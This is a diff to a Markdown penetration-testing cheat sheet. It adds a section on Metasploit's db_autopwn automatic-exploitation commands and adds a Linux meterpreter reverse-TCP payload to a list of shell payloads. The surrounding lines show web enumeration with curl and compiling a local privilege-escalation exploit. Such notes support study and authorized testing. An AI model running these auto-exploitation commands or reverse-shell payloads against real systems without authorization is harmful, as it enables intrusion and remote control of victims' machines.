@@ -89,6 +89,7 @@ Ctrl + B, 0 (1,2...) — Move to a specific window by number.
 # 1 Information Gathering and Enumeration
 - [FTP](#FTP)
 - [HTTP](#HTTP)
+- [metasploit-autopwn]
 - [MySQL](#MySQL)
 - [Port Scanning](#Port-Scanning)
 - [SMB/Samba](#SMBSamba)
@@ -149,6 +150,15 @@ curl http://<ip>/robots.txt
 curl http://<ip>/<directory>/
 ```
 - Check if directory listing (Apache) is enabled i.e. `Index of /<directory>`.
+
+## metasploit-autopwn
+```
+load db_autopwn
+db_autopwn -p -t
+db_autopwn -p -t -PI <port>
+```
+- https://github.com/hahwul/metasploit-autopwn
+- No longer in official MSF distro.
 
 ## MySQL
 ```
@@ -420,6 +430,8 @@ gcc -pthread 40839.c -o dirty -lcrypt
 windows/meterpreter/reverse_tcp
 windows/meterpreter/bind_tcp
 windows/x64/meterpreter/reverse_tcp
+
+linux/x86/meterpreter/reverse_tcp
 ```
 
 ## ProFTPD 1.3.3c
